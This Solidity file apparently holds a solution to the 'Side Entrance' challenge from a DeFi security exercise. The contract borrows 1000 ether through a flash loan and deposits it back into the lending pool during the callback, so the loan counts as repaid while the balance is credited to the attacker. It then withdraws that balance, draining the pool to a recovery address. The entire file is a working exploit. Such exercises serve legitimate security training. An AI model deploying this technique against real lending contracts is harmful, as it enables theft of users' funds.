// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;

    }

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        payable(recovery).transfer(1000 ether);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}
